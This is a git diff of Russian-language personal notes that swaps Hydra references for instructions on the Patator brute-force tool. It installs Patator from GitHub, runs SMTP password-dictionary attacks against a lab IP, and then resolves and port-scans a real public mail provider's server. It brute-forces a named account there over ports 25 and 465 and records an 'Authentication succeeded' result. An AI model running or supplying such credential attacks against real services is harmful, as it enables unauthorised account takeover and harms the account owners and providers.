@@ -1,8 +1,27 @@
-//Hydra
-https://codeby.net/bezopasnost/thc-hydra-ochen-bystryj-vzlomshhik-setevogo-vhoda-v-sistemu-chast-pervaja/
+//pataror
+https://defcon.ru/penetration-testing/1206/
 
+//Установка
+git clone https://github.com/lanjelot/patator.git /usr/share/patator
 
-https://www.youtube.com/watch?v=U_W_PzlFoZY
-https://www.youtube.com/watch?v=1Sj-Gi_Y0bE
-https://www.youtube.com/watch?v=tgSUEJB6dWQ
+//Просмотр опций
+/usr/share/patator/patator.py smtp_login
 
+//Сканирование логина по справочнику паролей
+patator smtp_login host=192.168.17.129 user=spendlively password=FILE0 0=/path/to/passwords
+//Сканирование всех логинов по справочнику паролей
+patator smtp_login host=192.168.17.129 user=spendlively password=FILE0 0=passwords.txt user=FILE1 1=logins.txt
+
+//БРУТ
+nslookup smtp.mail.ru
+Address: 94.100.180.160
+Address: 217.69.139.160
+
+nmap 94.100.180.160
+25/tcp   open   smtp
+465/tcp  open   smtps
+
+/usr/share/patator/patator.py smtp_login host=94.100.180.160 user=spendlively password=FILE0 0=/tmp/brut/1.txt
+/usr/share/patator/patator.py smtp_login host=94.100.180.160 port=465 ssl=1 user=spendlively password=FILE0 0=/tmp/brut/1.txt
+
+########## 	|     2 | Authentication succeeded
